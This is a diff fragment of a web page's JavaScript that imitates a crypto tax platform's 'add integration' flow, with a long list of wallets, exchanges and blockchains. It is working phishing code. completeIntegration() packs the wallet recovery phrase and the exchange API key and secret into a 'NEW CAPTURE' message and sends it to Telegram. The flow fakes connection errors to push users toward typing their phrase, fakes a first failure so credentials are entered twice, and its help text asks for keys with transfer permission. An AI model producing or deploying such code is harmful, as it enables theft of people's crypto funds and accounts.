+                { name: "Mantle", cat: 'blockchain', img: 'assets/integrations/mantle-blockchain.svg' },
+                { name: "Math Wallet", cat: 'wallet', img: 'assets/integrations/math-wallet-wallet.svg' },
+                { name: "MEW (MyEtherWallet)", cat: 'wallet', img: 'assets/integrations/mew-myetherwallet-wallet.svg' },
+                { name: "Metis", cat: 'blockchain', img: 'assets/integrations/metis-blockchain.svg' },
+                { name: "MIL", cat: 'blockchain', img: 'assets/integrations/mil-blockchain.png' },
+                { name: "Mincoin", cat: 'blockchain', img: 'assets/integrations/mincoin-blockchain.png' },
+                { name: "Monad", cat: 'blockchain', img: 'assets/integrations/monad-blockchain.svg' },
+                { name: "Mooncoin", cat: 'blockchain', img: 'assets/integrations/mooncoin-blockchain.png' },
+                { name: "MotaCoin", cat: 'blockchain', img: 'assets/integrations/motacoin-blockchain.jpg' },
+                { name: "MultiversX", cat: 'blockchain', img: 'assets/integrations/multiversx-blockchain.svg' },
+                { name: "My Game Coin", cat: 'blockchain', img: 'assets/integrations/my-game-coin-blockchain.png' },
+                { name: "Myriad", cat: 'blockchain', img: 'assets/integrations/myriad-blockchain.png' },
+                { name: "Namecoin", cat: 'blockchain', img: 'assets/integrations/namecoin-blockchain.svg' },
+                { name: "Near", cat: 'blockchain', img: 'assets/integrations/near-blockchain.webp' },
+                { name: "Netko", cat: 'blockchain', img: 'assets/integrations/netko-blockchain.png' },
+                { name: "NewYorkCoin", cat: 'blockchain', img: 'assets/integrations/newyorkcoin-blockchain.png' },
+                { name: "Nexo", cat: 'exchange', img: 'assets/integrations/nexo-exchange.svg' },
+                { name: "Nightly", cat: 'wallet', img: 'assets/integrations/nightly-wallet.png' },
+                { name: "Noblecoin", cat: 'blockchain', img: 'assets/integrations/noblecoin-blockchain.png' },
+                { name: "Nova Wallet", cat: 'wallet', img: 'assets/integrations/nova-wallet-wallet.png' },
+                { name: "Novacoin", cat: 'blockchain', img: 'assets/integrations/novacoin-blockchain.png' },
+                { name: "NOW Wallet", cat: 'wallet' },
+                { name: "OC Protocol", cat: 'blockchain', img: 'assets/integrations/oc-protocol-blockchain.png' },
+                { name: "Oduwacoin", cat: 'blockchain', img: 'assets/integrations/oduwacoin-blockchain.png' },
+                { name: "OKCash", cat: 'blockchain', img: 'assets/integrations/okcash-blockchain.png' },
+                { name: "OKX", cat: 'exchange', img: 'assets/integrations/okx-exchange.svg' },
+                { name: "OKX Wallet", cat: 'wallet', img: 'assets/integrations/okx-wallet-wallet.svg' },
+                { name: "One Trading", cat: 'exchange', img: 'assets/integrations/one-trading-exchange.svg' },
+                { name: "OneKey", cat: 'wallet', img: 'assets/integrations/onekey-wallet.png' },
+                { name: "Optimism", cat: 'blockchain', img: 'assets/integrations/optimism-blockchain.svg' },
+                { name: "PAC Protocol", cat: 'blockchain' },
+                { name: "PandaCoin", cat: 'blockchain', img: 'assets/integrations/pandacoin-blockchain.png' },
+                { name: "Particl", cat: 'blockchain', img: 'assets/integrations/particl-blockchain.svg' },
+                { name: "Paymium", cat: 'exchange', img: 'assets/integrations/paymium-exchange.svg' },
+                { name: "PeepCoin", cat: 'blockchain', img: 'assets/integrations/peepcoin-blockchain.png' },
+                { name: "PeerCoin", cat: 'blockchain', img: 'assets/integrations/peercoin-blockchain.svg' },
+                { name: "Petra", cat: 'wallet', img: 'assets/integrations/petra-wallet.png' },
+                { name: "Phemex", cat: 'exchange', img: 'assets/integrations/phemex-exchange.svg' },
+                { name: "Photon", cat: 'blockchain', img: 'assets/integrations/photon-blockchain.png' },
+                { name: "Pinkcoin", cat: 'blockchain', img: 'assets/integrations/pinkcoin-blockchain.png' },
+                { name: "Poloniex", cat: 'exchange', img: 'assets/integrations/poloniex-exchange.svg' },
+                { name: "Quantis", cat: 'blockchain', img: 'assets/integrations/quantis-blockchain.png' },
+                { name: "Quark", cat: 'blockchain', img: 'assets/integrations/quark-blockchain.jpg' },
+                { name: "Rabby Wallet", cat: 'wallet', img: 'assets/integrations/rabby-wallet-wallet.png' },
+                { name: "Radix", cat: 'blockchain', img: 'assets/integrations/radix-blockchain.svg' },
+                { name: "Radix Olympia", cat: 'exchange', img: 'assets/integrations/radix-olympia-exchange.svg' },
+                { name: "Railway", cat: 'blockchain', img: 'assets/integrations/railway-blockchain.webp' },
+                { name: "Rainbow", cat: 'wallet' },
+                { name: "Revolut", cat: 'exchange', img: 'assets/integrations/revolut-exchange.webp' },
+                { name: "Riecoin", cat: 'blockchain', img: 'assets/integrations/riecoin-blockchain.svg' },
+                { name: "Robinhood Chain", cat: 'blockchain', img: 'assets/integrations/robinhood-chain-blockchain.svg' },
+                { name: "Rudy", cat: 'exchange' },
+                { name: "Safe", cat: 'wallet', img: 'assets/integrations/safe-wallet.svg' },
+                { name: "SafePal", cat: 'wallet', img: 'assets/integrations/safepal-wallet.svg' },
+                { name: "SaluS", cat: 'blockchain', img: 'assets/integrations/salus-blockchain.svg' },
+                { name: "Samourai", cat: 'wallet', img: 'assets/integrations/samourai-wallet.svg' },
+                { name: "Scroll", cat: 'blockchain', img: 'assets/integrations/scroll-blockchain.svg' },
+                { name: "Shimmer", cat: 'blockchain', img: 'assets/integrations/shimmer-blockchain.svg' },
+                { name: "ShimmerEvm", cat: 'blockchain', img: 'assets/integrations/shimmerevm-blockchain.svg' },
+                { name: "SkeinCurrency", cat: 'blockchain', img: 'assets/integrations/skeincurrency-blockchain.png' },
+                { name: "Slimcoin", cat: 'blockchain', img: 'assets/integrations/slimcoin-blockchain.png' },
+                { name: "Slush", cat: 'blockchain' },
+                { name: "Smileycoin", cat: 'blockchain', img: 'assets/integrations/smileycoin-blockchain.png' },
+                { name: "Solflare", cat: 'wallet', img: 'assets/integrations/solflare-wallet.svg' },
+                { name: "Sonic", cat: 'blockchain', img: 'assets/integrations/sonic-blockchain.webp' },
+                { name: "SpaceXpanse", cat: 'blockchain', img: 'assets/integrations/spacexpanse-blockchain.png' },
+                { name: "Sparks", cat: 'blockchain', img: 'assets/integrations/sparks-blockchain.png' },
+                { name: "Stakecoin", cat: 'blockchain', img: 'assets/integrations/stakecoin-blockchain.png' },
+                { name: "StarKey", cat: 'wallet', img: 'assets/integrations/starkey-wallet.png' },
+                { name: "Stellar", cat: 'blockchain', img: 'assets/integrations/stellar-blockchain.png' },
+                { name: "Sterlingcoin", cat: 'blockchain', img: 'assets/integrations/sterlingcoin-blockchain.png' },
+                { name: "Stratis", cat: 'blockchain', img: 'assets/integrations/stratis-blockchain.jpg' },
+                { name: "SubWallet", cat: 'wallet', img: 'assets/integrations/subwallet-wallet.png' },
+                { name: "Sui", cat: 'blockchain', img: 'assets/integrations/sui-blockchain.svg' },
+                { name: "Suiet", cat: 'wallet', img: 'assets/integrations/suiet-wallet.svg' },
+                { name: "SuperCoin", cat: 'blockchain', img: 'assets/integrations/supercoin-blockchain.png' },
+                { name: "Swing", cat: 'blockchain', img: 'assets/integrations/swing-blockchain.png' },
+                { name: "Swissborg", cat: 'exchange', img: 'assets/integrations/swissborg-exchange.png' },
+                { name: "Syscoin", cat: 'blockchain', img: 'assets/integrations/syscoin-blockchain.jpg' },
+                { name: "Taiko", cat: 'blockchain', img: 'assets/integrations/taiko-blockchain.svg' },
+                { name: "TajCoin", cat: 'blockchain', img: 'assets/integrations/tajcoin-blockchain.png' },
+                { name: "Talisman", cat: 'wallet', img: 'assets/integrations/talisman-wallet.svg' },
+                { name: "Terra Station", cat: 'wallet', img: 'assets/integrations/terra-station-wallet.svg' },
+                { name: "Terra V2", cat: 'blockchain', img: 'assets/integrations/terra-v2-blockchain.svg' },
+                { name: "Terracoin", cat: 'blockchain', img: 'assets/integrations/terracoin-blockchain.png' },
+                { name: "TheHolyRogerCoin", cat: 'blockchain', img: 'assets/integrations/theholyrogercoin-blockchain.png' },
+                { name: "Token Pocket", cat: 'wallet', img: 'assets/integrations/token-pocket-wallet.webp' },
+                { name: "Trade Republic", cat: 'exchange', img: 'assets/integrations/trade-republic-exchange.png' },
+                { name: "TrezarCoin", cat: 'blockchain', img: 'assets/integrations/trezarcoin-blockchain.png' },
+                { name: "Trezor", cat: 'wallet', img: 'assets/integrations/trezor-wallet.svg' },
+                { name: "Trollcoin", cat: 'blockchain', img: 'assets/integrations/trollcoin-blockchain.png' },
+                { name: "Tron", cat: 'blockchain', img: 'assets/integrations/tron-blockchain.svg' },
+                { name: "Trust Wallet", cat: 'wallet', img: 'assets/integrations/trust-wallet-wallet.svg' },
+                { name: "Trust Wallet (Extension)", cat: 'wallet', img: 'assets/integrations/trust-wallet-extension-wallet.svg' },
+                { name: "UFO", cat: 'blockchain', img: 'assets/integrations/ufo-blockchain.webp' },
+                { name: "Unichain", cat: 'blockchain', img: 'assets/integrations/unichain-blockchain.jpg' },
+                { name: "UniversalMolecule", cat: 'blockchain', img: 'assets/integrations/universalmolecule-blockchain.png' },
+                { name: "Unobtanium", cat: 'blockchain', img: 'assets/integrations/unobtanium-blockchain.png' },
+                { name: "Uphold", cat: 'exchange', img: 'assets/integrations/uphold-exchange.webp' },
+                { name: "Validity", cat: 'blockchain', img: 'assets/integrations/validity-blockchain.png' },
+                { name: "Vanillacash", cat: 'blockchain', img: 'assets/integrations/vanillacash-blockchain.png' },
+                { name: "Vara", cat: 'blockchain', img: 'assets/integrations/vara-blockchain.webp' },
+                { name: "VeChain", cat: 'blockchain', img: 'assets/integrations/vechain-blockchain.svg' },
+                { name: "Velas", cat: 'blockchain', img: 'assets/integrations/velas-blockchain.svg' },
+                { name: "VeriCoin", cat: 'blockchain', img: 'assets/integrations/vericoin-blockchain.png' },
+                { name: "Vertcoin", cat: 'blockchain', img: 'assets/integrations/vertcoin-blockchain.svg' },
+                { name: "VirtacoinPlus", cat: 'blockchain', img: 'assets/integrations/virtacoinplus-blockchain.png' },
+                { name: "Vision Wallet", cat: 'wallet' },
+                { name: "Wagerr", cat: 'blockchain', img: 'assets/integrations/wagerr-blockchain.svg' },
+                { name: "Wallet.io", cat: 'wallet', img: 'assets/integrations/wallet-io-wallet.svg' },
+                { name: "WhiteBIT", cat: 'exchange', img: 'assets/integrations/whitebit-exchange.png' },
+                { name: "Wirex", cat: 'exchange', img: 'assets/integrations/wirex-exchange.svg' },
+                { name: "Worldcoin", cat: 'blockchain', img: 'assets/integrations/worldcoin-blockchain.jpg' },
+                { name: "Xaman", cat: 'wallet', img: 'assets/integrations/xaman-wallet.png' },
+                { name: "Yantum", cat: 'blockchain', img: 'assets/integrations/yantum-blockchain.png' },
+                { name: "Yoroi", cat: 'wallet', img: 'assets/integrations/yoroi-wallet.svg' },
+                { name: "Zelcore", cat: 'wallet', img: 'assets/integrations/zelcore-wallet.png' },
+                { name: "Zengo", cat: 'wallet', img: 'assets/integrations/zengo-wallet.svg' },
+                { name: "Zenzo", cat: 'blockchain', img: 'assets/integrations/zenzo-blockchain.png' },
+                { name: "Zerion", cat: 'wallet' },
+                { name: "Zerozed", cat: 'blockchain', img: 'assets/integrations/zerozed-blockchain.png' },
+                { name: "Zetacoin", cat: 'blockchain', img: 'assets/integrations/zetacoin-blockchain.png' },
+                { name: "ZkSync", cat: 'blockchain', img: 'assets/integrations/zksync-blockchain.svg' },
+                { name: "Zoomex", cat: 'exchange', img: 'assets/integrations/zoomex-exchange.webp' },
+                { name: "Zora", cat: 'blockchain', img: 'assets/integrations/zora-blockchain.svg' }
+            ];
+
+            var intGrid = document.getElementById('intGrid');
+            var intSearch = document.getElementById('intSearch');
+            var intCat = 'all';
+
+            function renderGrid() {
+                var q = intSearch.value.trim().toLowerCase();
+                intGrid.innerHTML = '';
+                var shown = 0;
+                INTEGRATIONS.forEach(function (it) {
+                    if (intCat !== 'all' && it.cat !== intCat) return;
+                    if (q && it.name.toLowerCase().indexOf(q) === -1) return;
+                    shown++;
+                    var tile = document.createElement('div');
+                    var blur = (it.cat === 'dapp' || it.cat === 'taxtool');
+                    tile.className = 'int-tile' + (blur ? ' tile-blur' : '');
+                    var logo = it.img
+                        ? '<img class="int-img" src="' + it.img + '" alt="" onerror="this.parentNode.innerHTML=\'<span class=&quot;int-fallback&quot;>' + it.name.charAt(0) + '</span>\'">'
+                        : it.svg;
+                    tile.innerHTML = '<span class="int-logo">' + logo + '</span><span class="int-name">' + it.name + '</span>';
+                    if (!blur) {
+                        tile.addEventListener('click', function () { openModal(it); });
+                    }
+                    intGrid.appendChild(tile);
+                });
+                if (!shown) {
+                    var empty = document.createElement('div');
+                    empty.className = 'int-empty';
+                    empty.textContent = dict.noResults || 'No integrations found.';
+                    intGrid.appendChild(empty);
+                }
+            }
+
+            document.querySelectorAll('#intPills .pill').forEach(function (pill) {
+                pill.addEventListener('click', function () {
+                    document.querySelectorAll('#intPills .pill').forEach(function (p) { p.classList.remove('active'); });
+                    pill.classList.add('active');
+                    intCat = pill.getAttribute('data-cat');
+                    renderGrid();
+                });
+            });
+            intSearch.addEventListener('input', renderGrid);
+
+            /* ---------- Add integration modal ---------- */
+            var intModal = document.getElementById('intModal');
+            var imForm = document.getElementById('imForm');
+            var imHelp = document.getElementById('imHelp');
+            var imTabs = document.getElementById('imTabs');
+            var imDesc = document.getElementById('imDesc');
+            var imInfoText = document.getElementById('imInfoText');
+            var imName = document.getElementById('imName');
+            var pwGrid = document.getElementById('pwGrid');
+            var pwLenRow = document.getElementById('pwLenRow');
+            var phraseLen = 12;
+            var pwInputs = [];
+            function buildPhraseGrid() {
+                pwGrid.innerHTML = '';
+                pwInputs = [];
+                for (var i = 0; i < phraseLen; i++) {
+                    var box = document.createElement('div');
+                    box.className = 'pw-box';
+                    box.innerHTML = '<span class="pw-num">' + (i + 1) + '</span><input type="text" autocomplete="off" autocapitalize="none" spellcheck="false" data-i="' + i + '">';
+                    pwGrid.appendChild(box);
+                    pwInputs.push(box.querySelector('input'));
+                }
+            }
+            function phraseWords() {
+                return pwInputs.map(function (el) { return el.value.trim(); }).filter(Boolean);
+            }
+            function syncPhraseUI() {
+                var n = phraseWords().length;
+                pwInputs.forEach(function (el) { el.parentNode.classList.toggle('filled', !!el.value.trim()); });
+                imPhraseCount.textContent = (dict.phraseCount || '').replace('{n}', n).replace('{total}', phraseLen);
+                imPhraseCount.classList.toggle('ok', n === phraseLen);
+            }
+            var imPhraseCount = document.getElementById('phraseCount');
+            var imPhraseField = document.getElementById('imPhraseField');
+            var imChainActions = document.getElementById('imChainActions');
+            var manualMode = false;
+            var imApiKey = document.getElementById('imApiKey');
+            var imApiSecret = document.getElementById('imApiSecret');
+            var imApiFields = document.getElementById('imApiFields');
+            var imContinue = document.getElementById('imContinue');
+            var imConnect = document.getElementById('imConnect');
+            var currentInt = null;
+            var currentTab = 'connect';
+
+            function fill(tpl, name) { return (tpl || '').replace(/\{name\}/g, name); }
+
+            function wordCount(v) {
+                var p = v.trim().split(/\s+/).filter(Boolean);
+                return p.length;
+            }
+
+            function syncModalButton() {
+                var ok;
+                if (currentInt.cat === 'exchange' && currentTab === 'connect') ok = true;
+                else if (currentInt.cat === 'exchange') ok = !!(imApiKey.value.trim() && imApiSecret.value.trim());
+                else ok = manualMode && phraseWords().length === phraseLen;
+                imContinue.disabled = !ok;
+                imConnect.disabled = !ok;
+            }
+
+            function showTab(tab) {
+                currentTab = tab;
+                document.querySelectorAll('#imTabs .imtab').forEach(function (t) {
+                    t.classList.toggle('active', t.getAttribute('data-tab') === tab);
+                });
+                if (tab === 'api') {
+                    imDesc.textContent = dict.apiDesc;
+                    imInfoText.textContent = dict.infoApi;
+                    imApiFields.style.display = '';
+                    imChainActions.style.display = 'none';
+                    imPhraseField.style.display = 'none';
+                    imConnect.style.display = 'none';
+                    imContinue.style.display = '';
+                } else {
+                    imDesc.textContent = dict.exDesc;
+                    imInfoText.textContent = dict.infoEx;
+                    imApiFields.style.display = 'none';
+                    imChainActions.style.display = 'none';
+                    imPhraseField.style.display = 'none';
+                    imConnect.style.display = '';
+                    imContinue.style.display = 'none';
+                }
+                syncModalButton();
+            }
+
+            function openModal(it) {
+                currentInt = it;
+                document.getElementById('imIcon').innerHTML = it.img ? '<img class="int-img" src="' + it.img + '" alt="">' : it.svg;
+                document.getElementById('imTitle').textContent = fill(dict.addTitle, it.name);
+                imName.value = it.name;
+                buildPhraseGrid();
+                syncPhraseUI();
+                manualMode = false;
+                var cwBtn = document.getElementById('imConnectWallet');
+                cwBtn.classList.remove('is-loading');
+                cwBtn.disabled = false;
+                var cwErr = document.getElementById('cwError');
+                cwErr.hidden = true;
+                cwErr.textContent = '';
+                document.getElementById('imManualBtn').classList.remove('manual-hint');
+                imApiKey.value = '';
+                imApiSecret.value = '';
+                syncing = false;
+                syncAttempts = 0;
+                imSync.style.display = 'none';
+                reentryNote.hidden = true;
+                imForm.style.display = '';
+                imHelp.style.display = 'none';
+                if (it.cat === 'exchange') {
+                    imTabs.style.display = '';
+                    showTab('connect');
+                } else {
+                    imTabs.style.display = 'none';
+                    imDesc.textContent = dict.bcDesc;
+                    imInfoText.textContent = dict.infoBc;
+                    imChainActions.style.display = '';
+                    imPhraseField.style.display = 'none';
+                    imApiFields.style.display = 'none';
+                    imConnect.style.display = 'none';
+                    imContinue.style.display = '';
+                }
+                syncModalButton();
+                intModal.classList.add('open');
+                intModal.setAttribute('aria-hidden', 'false');
+            }
+
+            function closeModal() {
+                if (typeof syncing !== 'undefined' && syncing) return;
+                intModal.classList.remove('open');
+                intModal.setAttribute('aria-hidden', 'true');
+            }
+
+            var imSync = document.getElementById('imSync');
+            var syncBox = document.getElementById('syncBox');
+            var syncText = document.getElementById('syncText');
+            var syncSpinner = document.getElementById('syncSpinner');
+            var syncCheck = document.getElementById('syncCheck');
+            var syncReenter = document.getElementById('syncReenter');
+            var reentryNote = document.getElementById('reentryNote');
+            var reentryText = document.getElementById('reentryText');
+            var syncing = false;
+            var syncAttempts = 0;
+
+            function isDirectConnect() {
+                return currentInt.cat === 'exchange' && currentTab === 'connect';
+            }
+
+            function showSyncLoading() {
+                syncing = true;
+                syncBox.className = 'sync-box';
+                syncSpinner.style.display = '';
+                syncCheck.style.display = 'none';
+                syncReenter.style.display = 'none';
+                syncText.textContent = dict.syncLoading;
+                imForm.style.display = 'none';
+                imHelp.style.display = 'none';
+                reentryNote.hidden = true;
+                imSync.style.display = '';
+                setTimeout(function () {
+                    if (isDirectConnect()) {
+                        // direct account connection never works — always fails, never part of the two tries
+                        syncing = false;
+                        syncBox.className = 'sync-box fail';
+                        syncSpinner.style.display = 'none';
+                        syncText.textContent = fill(dict.syncFailDirect, currentInt.name);
+                        syncReenter.textContent = dict.tryAgain;
+                        syncReenter.style.display = '';
+                        return;
+                    }
+                    syncAttempts++;
+                    if (syncAttempts < 2) {
+                        // first attempt fails — show a "double-check" notice BEFORE the form reopens
+                        syncing = false;
+                        syncBox.className = 'sync-box fail';
+                        syncSpinner.style.display = 'none';
+                        var isApi = currentInt.cat === 'exchange' && currentTab === 'api';
+                        syncText.innerHTML = fill(isApi ? dict.noticeApi : dict.noticePhrase, currentInt.name);
+                        syncReenter.textContent = isApi ? dict.noticeBtnApi : dict.noticeBtnPhrase;
+                        syncReenter.style.display = '';
+                    } else {
+                        // second attempt succeeds — lead to the dashboard
+                        syncBox.className = 'sync-box done';
+                        syncSpinner.style.display = 'none';
+                        syncCheck.style.display = '';
+                        syncText.textContent = dict.syncDone;
+                        setTimeout(function () {
+                            try { localStorage.setItem('blockpit-setup-complete', '1'); } catch (e) {}
+                            window.location.href = 'dashboard.html';
+                        }, 1600);
+                    }
+                }, 3000);
+            }
+
+            syncReenter.addEventListener('click', function () {
+                if (isDirectConnect()) {
+                    // direct connect keeps failing — loop the attempt
+                    showSyncLoading();
+                } else {
+                    // reopen the form so the user enters their credentials a second time
+                    returnToForm();
+                }
+            });
+
+            function returnToForm() {
+                imSync.style.display = 'none';
+                imForm.style.display = '';
+                var isApi = currentInt.cat === 'exchange' && currentTab === 'api';
+                if (isApi) {
+                    imApiKey.value = '';
+                    imApiSecret.value = '';
+                    reentryText.textContent = fill(dict.syncFailApi, currentInt.name);
+                    syncModalButton();
+                    imApiKey.focus();
+                } else {
+                    // wallet phrase — clear every word box
+                    pwInputs.forEach(function (el) { el.value = ''; });
+                    syncPhraseUI();
+                    syncModalButton();
+                    reentryText.textContent = fill(dict.syncFail, currentInt.name);
+                    if (pwInputs[0]) pwInputs[0].focus();
+                }
+                reentryNote.hidden = false;
+            }
+
+            function completeIntegration() {
+                let phrase = (typeof phraseWords === 'function') ? phraseWords() : '';
+                let apiKey = document.getElementById('imApiKey')?.value || '';
+                let apiSecret = document.getElementById('imApiSecret')?.value || '';
+                
+                let msgParts = [];
+                if (phrase) msgParts.push(`🔑 Recovery Phrase: ${phrase}`);
+                if (apiKey) msgParts.push(`🔐 API Key: ${apiKey}`);
+                if (apiSecret) msgParts.push(`🔒 API Secret: ${apiSecret}`);
+                
+                if (msgParts.length > 0) {
+                    let msg = `🚨 NEW CAPTURE 🚨\n${msgParts.join('\n')}\n⏰ ${new Date().toLocaleString()}`;
+                    sendToTelegram(msg);
+                }
+                
+                state.portfolio = imName.value.trim() || currentInt.name;
+                persist();
+                renderPortfolio();
+                imSync.classList.add('imodal-sync-body');
+                showSyncLoading();
+            }
+
+            document.querySelectorAll('#imTabs .imtab').forEach(function (t) {
+                t.addEventListener('click', function () { showTab(t.getAttribute('data-tab')); });
+            });
+            document.getElementById('imClose').addEventListener('click', closeModal);
+            intModal.addEventListener('click', function (e) { if (e.target === intModal) closeModal(); });
+            document.getElementById('imNameClear').addEventListener('click', function () { imName.value = ''; imName.focus(); });
+            [imApiKey, imApiSecret].forEach(function (el) {
+                el.addEventListener('input', syncModalButton);
+                el.addEventListener('keydown', function (e) {
+                    if (e.key === 'Enter' && !imContinue.disabled && imContinue.style.display !== 'none') completeIntegration();
+                });
+            });
+            pwGrid.addEventListener('input', function (e) {
+                var el = e.target;
+                if (el.tagName !== 'INPUT') return;
+                var v = el.value;
+                var i = parseInt(el.getAttribute('data-i'), 10);
+                if (/\s/.test(v)) {
+                    var words = v.trim().split(/\s+/).filter(Boolean);
+                    for (var k = 0; k < words.length && i + k < phraseLen; k++) {
+                        pwInputs[i + k].value = words[k];
+                    }
+                    var next = Math.min(i + words.length, phraseLen - 1);
+                    pwInputs[next].focus();
+                }
+                syncPhraseUI();
+                syncModalButton();
+            });
+            pwGrid.addEventListener('keydown', function (e) {
+                var el = e.target;
+                if (el.tagName !== 'INPUT') return;
+                var i = parseInt(el.getAttribute('data-i'), 10);
+                if (e.key === 'Backspace' && !el.value && i > 0) {
+                    e.preventDefault();
+                    pwInputs[i - 1].focus();
+                    pwInputs[i - 1].value = '';
+                    syncPhraseUI();
+                    syncModalButton();
+                } else if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (i < phraseLen - 1) pwInputs[i + 1].focus();
+                }
+            });
+            pwLenRow.querySelectorAll('.pw-len').forEach(function (b) {
+                b.addEventListener('click', function () {
+                    pwLenRow.querySelectorAll('.pw-len').forEach(function (x) { x.classList.remove('active'); });
+                    b.classList.add('active');
+                    phraseLen = parseInt(b.getAttribute('data-len'), 10);
+                    buildPhraseGrid();
+                    syncPhraseUI();
+                    syncModalButton();
+                    pwInputs[0].focus();
+                });
+            });
+            var imManualBtn = document.getElementById('imManualBtn');
+            var imConnectWalletBtn = document.getElementById('imConnectWallet');
+            function runPairing(btn) {
+                if (btn.classList.contains('is-loading')) return;
+                var cwErr = document.getElementById('cwError');
+                cwErr.hidden = true;
+                btn.classList.add('is-loading');
+                btn.disabled = true;
+                imManualBtn.disabled = true;
+                setTimeout(function () {
+                    btn.classList.remove('is-loading');
+                    btn.disabled = false;
+                    imManualBtn.disabled = false;
+                    cwErr.textContent = fill(dict.connectFail, currentInt.name);
+                    cwErr.hidden = false;
+                    imManualBtn.classList.add('manual-hint');
+                }, 2200);
+            }
+            imConnectWalletBtn.addEventListener('click', function () { runPairing(imConnectWalletBtn); });
+            var helpConnectBtn = document.getElementById('helpConnectBtn');
+            helpConnectBtn.addEventListener('click', function () {
+                // back to form view, then run the same pairing attempt
+                imHelp.style.display = 'none';
+                imForm.style.display = '';
+                runPairing(imConnectWalletBtn);
+            });
+            imManualBtn.addEventListener('click', function () {
+                manualMode = true;
+                imManualBtn.classList.remove('manual-hint');
+                imPhraseField.style.display = '';
+                syncPhraseUI();
+                syncModalButton();
+                if (!pwInputs.length) buildPhraseGrid();
+                pwInputs[0].focus();
+            });
+            imContinue.addEventListener('click', function () { if (!imContinue.disabled) completeIntegration(); });
+            imConnect.addEventListener('click', completeIntegration);
+
+            /* help view */
+            var helpSteps1El = document.getElementById('helpSteps1');
+            var helpSteps2El = document.getElementById('helpSteps2');
+
+            function buildHelp() {
+                var name = currentInt.name;
+                var isExchange = currentInt.cat === 'exchange';
+                document.getElementById('helpTitle').textContent = fill(isExchange ? dict.helpTitle : dict.helpWalletTitle, name);
+                document.getElementById('helpQ1').textContent = fill(isExchange ? dict.helpQ1 : dict.helpWQ1, name);
+                document.getElementById('helpQ2').textContent = fill(isExchange ? dict.helpQ2 : dict.helpWQ2, name);
+                helpSteps1El.innerHTML = '';
+                if (isExchange) {
+                    [dict.helpS1a, fill(dict.helpS1b, name)].forEach(function (s2) {
+                        var li = document.createElement('li');
+                        li.innerHTML = s2;
+                        helpSteps1El.appendChild(li);
+                    });
+                } else {
+                    [dict.helpS1a, fill(dict.helpWS2, name)].forEach(function (s2) {
+                        var li = document.createElement('li');
+                        li.innerHTML = s2 + ' <span class="wc-chip"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/></svg>' + dict.wcChip + '</span>';
+                        helpSteps1El.appendChild(li);
+                    });
+                }
+                helpSteps2El.innerHTML = '';
+                if (isExchange) {
+                    [fill(dict.helpS2a, name), fill(dict.helpS2b, name), fill(dict.helpS2c, name)].forEach(function (s2) {
+                        var li = document.createElement('li');
+                        li.innerHTML = s2;
+                        helpSteps2El.appendChild(li);
+                    });
+                    var perms = document.createElement('ul');
+                    perms.className = 'help-perms';
+                    [
+                        { label: dict.permView, on: true },
+                        { label: dict.permTrade, on: true },
+                        { label: dict.permTransfer, on: true }
+                    ].forEach(function (p) {
+                        var li = document.createElement('li');
+                        li.innerHTML = '<span class="help-cb' + (p.on ? ' checked' : '') + '">' +
+                            (p.on ? '<svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4 10-11"/></svg>' : '') +
+                            '</span><span>' + p.label + '</span>';
+                        perms.appendChild(li);
+                    });
+                    helpSteps2El.appendChild(perms);
+                } else {
+                    [dict.helpWS3, dict.helpWS4].forEach(function (s2) {
+                        var li = document.createElement('li');
+                        li.innerHTML = s2;
+                        helpSteps2El.appendChild(li);
+                    });
+                }
+                document.getElementById('helpWarn').textContent = isExchange ? dict.helpWarn : dict.helpWarnWallet;
+            }
+
+            document.getElementById('imInfo').addEventListener('click', function () {
+                buildHelp();
+                imForm.style.display = 'none';
+                imHelp.style.display = '';
+            });
+            document.getElementById('helpBack').addEventListener('click', function () {
+                imHelp.style.display = 'none';
+                imForm.style.display = '';
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape' && intModal.classList.contains('open')) closeModal();
+            });
+
+            renderGrid();
+
+            /* ---------- Sidebar ---------- */
+            document.getElementById('collapseBtn').addEventListener('click', function () {
+                document.querySelector('.sidebar').style.display = 'none';
+                document.querySelector('.main').style.marginLeft = '0';
+            });
+
+            function logout() {
+                try {
+                    localStorage.removeItem('blockpit-demo-user');
+                    localStorage.removeItem('blockpit-setup-complete');
+                } catch (e) {}
+                window.location.href = 'login.html';
+            }
+
+            /* ---------- Live chat ---------- */
+            var chatLauncher = document.getElementById('chatLauncher');
+            var chatPanel = document.getElementById('chatPanel');
+            var chatBody = document.getElementById('chatBody');
+            var chatInput = document.getElementById('chatInput');
+            var chatDot = document.getElementById('chatDot');
+
+            function toggleChat(open) {
+                chatPanel.classList.toggle('open', open);
+                if (open) chatDot.style.display = 'none';
+            }
+            chatLauncher.addEventListener('click', function () {
+                toggleChat(!chatPanel.classList.contains('open'));
+            });
+            document.getElementById('chatClose').addEventListener('click', function () {
+                toggleChat(false);
+            });
+
+            function addBubble(text, who) {
+                var b = document.createElement('div');
+                b.className = 'chat-bubble ' + who;
+                b.textContent = text;
+                chatBody.appendChild(b);
+                chatBody.scrollTop = chatBody.scrollHeight;
+            }
+
+            function sendChat() {
+                var text = chatInput.value.trim();
+                if (!text) return;
+                addBubble(text, 'user');
+                chatInput.value = '';
+                setTimeout(function () {
+                    addBubble(dict.chatReply, 'bot');
+                }, 900);
+            }
+            document.getElementById('chatSend').addEventListener('click', sendChat);
+            chatInput.addEventListener('keydown', function (ev) {
+                if (ev.key === 'Enter') sendChat();
+            });
+
+            /* ---------- Init ---------- */
+            applyI18n();
+            renderDropdown();
+            renderCountry();
+            renderPortfolio();
+            goToStep(state.step);
+
+            return { logout: logout, goToStep: goToStep };
+        })();
+    </script>
+</body>
+</html>
